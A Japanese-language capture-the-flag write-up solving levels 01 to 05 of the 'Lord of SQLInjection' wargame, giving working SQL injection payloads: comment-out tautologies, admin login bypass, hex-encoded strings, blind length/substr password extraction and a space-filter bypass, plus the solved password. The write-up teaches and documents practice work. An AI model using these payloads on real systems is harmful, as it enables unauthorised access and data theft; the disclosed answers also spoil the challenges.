# Lord of SQLInjection writeup 01-05
## 01 - gremlin
GETパラメータ`id`と`pw`を特に無害化などしていないことが分かる。  
何か結果が返ればよいので、or文で条件を崩し、後方をコメントアウトする。

### 解答例
```
?id=1' or '1'='1'%23
```
> query : select id from prob_gremlin where id='1' or '1'='1'#' and pw=''

`%23`は`#`をURLエンコードしたもの。  
`#`のままブラウザでアクセスすると、URLフラグメントの扱いになるため。

### 別解
```
?id=1' or '1'='1'-- hoge
```
> query : select id from prob_gremlin where id='1' or '1'='1'-- hoge' and pw=''

MySQLの場合、`--`ではなく`-- `でコメントアウト。  
URL末尾のスペースはそのままだと無視されるので、` hoge`を入れてみた。

## 02 - cobolt

SQLの結果から、`id`が`admin`か確認しているので、その通り指定する。  
パスワードは分からないので前の問題同様、コメントアウトする。  

### 解答例
```
?id=admin'%23
```
> query : select id from prob_cobolt where id='admin'#' and pw=md5('')

## 03 - goblin
SQLの結果から、`id`が`admin`か確認しているが、既に`id='guest'`がベタ書きされている。  
また、クォーテーションを含むとエラーにされるので、`id='admin'`と書き足せない。  
文字列を条件にする場合、`'admin'`のようにせず、Hexで表すことができるので、試してみる。

```shell
$ echo -n admin | xxd
00000000: 6164 6d69 6e                             admin
```

### 解答例
```
?no=0 or id=0x61646d696e
```
> query : select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e

### 別解
絶対に想定解ではないが、これでも正解になった。  
`admin`の方が`guest`より前に来て、かつ、他に前に来るデータがないと思われる。  
```
?no=0 or 1=1 order by 1
```
> query : select id from prob_goblin where id='guest' and no=0 or 1=1 order by 1

## 04 - orc
`admin`のデータが取れれば取り合えずHello adminと表示してくれるが、  
実際のパスワードとGETパラメータの`pw`が一致していないとクリアできない。  
まずは`admin`の`pw`が何文字かを当てる。  

```
?pw=' or id='admin' and length(pw)=1%23
?pw=' or id='admin' and length(pw)=2%23
:
?pw=' or id='admin' and length(pw)=8%23
```
> query : select id from prob_orc where id='admin' and pw='' or id='admin' and length(pw)=8#'

Hello adminと表示されることでパスワードは8文字であることが分かる。  
1文字目は何か、2文字目は何か…ひたすら試行する。
```
?pw=' or id='admin' and substr(pw,1,1)=0%23
?pw=' or id='admin' and substr(pw,2,1)=0%23
?pw=' or id='admin' and substr(pw,2,1)=1%23
:
```

### 解答例
```
?pw=095a9852
```
> query : select id from prob_orc where id='admin' and pw='095a9852'

## 05 - prob_wolfman 
半角スペースが禁止されているので`or id='admin`のように書き足せない。  
MySQLだと`and`は`&&`、`or`は`||`でも書くことができる。  

### 解答例
```
?pw='||id='admin
```
> query : select id from prob_wolfman where id='guest' and pw=''||id='admin'
